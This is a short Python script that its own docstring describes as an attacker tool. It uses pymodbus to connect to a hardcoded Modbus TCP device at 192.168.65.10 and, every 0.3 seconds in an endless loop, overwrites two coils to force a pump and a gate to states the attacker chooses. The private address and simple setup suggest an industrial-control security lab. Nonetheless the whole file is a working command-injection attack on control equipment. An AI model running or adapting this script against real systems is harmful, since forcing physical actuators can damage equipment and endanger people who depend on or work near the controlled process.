#!/usr/bin/env python3
"""
Directly inject modbus commands as an attacker, forcing the coil value to our desired values.

Based on the Pymodbus asynchronous client example.

usage: inject.py [-h] [--pump | --no-pump] [--gate | --no-gate]

options:
  -h, --help         show this help message and exit
  --pump, --no-pump  Force the pump to turn on/off (default off)
  --gate, --no-gate  Force the gate to be opened/closed (default closed)

"""
from __future__ import annotations

import asyncio
import logging
import argparse

import pymodbus.client as modbusClient


_logger = logging.getLogger(__file__)
_logger.setLevel("DEBUG")


def setup_args():
    parser = argparse.ArgumentParser(prog="inject.py")
    parser.add_argument('--pump',
                        help='Force the pump to turn on/off (default off)',
                        action=argparse.BooleanOptionalAction,
                        default=False)
    parser.add_argument('--gate', 
                        help="Force the gate to be opened/closed (default closed)",
                        action=argparse.BooleanOptionalAction,
                        default=False)
    args = parser.parse_args()
    return args


def setup_async_client() -> modbusClient.ModbusBaseClient:
    """Run client setup."""
    _logger.info("### Create client object")
    client: modbusClient.ModbusBaseClient | None = None
    client = modbusClient.AsyncModbusTcpClient(
            '192.168.65.10',
            port='502', 
            # Common optional parameters:
            framer='socket',
            timeout=10,
            retries=3,
            reconnect_delay=1,
            reconnect_delay_max=10,
        )
    return client


async def run_async_client(client, modbus_calls=None, args=None):
    """Run sync client."""
    _logger.info("### Client starting")
    await client.connect()
    assert client.connected
    if modbus_calls:
        await modbus_calls(client, args)
    client.close()
    _logger.info("### End of Program")


async def run_a_few_calls(client, args):
    """Overwrite coil values to desired values."""

    print('Overwriting pump to', args.pump)
    print('Overwriting gate to', args.gate)

    while True:
        # overwrite both pump and gate to our desired value
        rr = await client.write_coil(0,args.pump)
        rr = await client.write_coil(1,args.gate)
        print(rr)
        await asyncio.sleep(0.3)


async def main(cmdline=None):
    """Combine setup and run."""
    args = setup_args()
    testclient = setup_async_client()
    await run_async_client(testclient, modbus_calls=run_a_few_calls, args=args)


if __name__ == "__main__":
    asyncio.run(main(), debug=True)
